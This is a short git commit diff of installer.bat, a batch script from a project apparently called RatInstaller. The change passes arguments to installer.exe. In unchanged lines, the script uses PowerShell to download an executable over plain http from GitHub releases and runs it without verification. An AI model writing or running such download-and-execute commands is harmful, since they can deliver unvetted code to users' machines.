f31193e00f46f0512a748de57d4cdb292087c79c
SPRAVEDLIVO <misha.domanov@mail.ru>
2021-05-10 23:29:21 +0300

    Update installer.bat

--- installer.bat
+++ installer.bat
@@ -1,9 +1,9 @@
 @echo off
 title Installer downloader
 IF EXIST "installer.exe" (
-  installer.exe
+  installer.exe %1 %2
 ) ELSE (
   echo Installer script wasn't found. Downloading...
   powershell -Command "(New-Object Net.WebClient).DownloadFile('http://github.com/SPRAVEDLIVO/RatInstaller/releases/latest/download/installer.exe', 'installer.exe')"
-  installer.exe
+  installer.exe %1 %2
 )
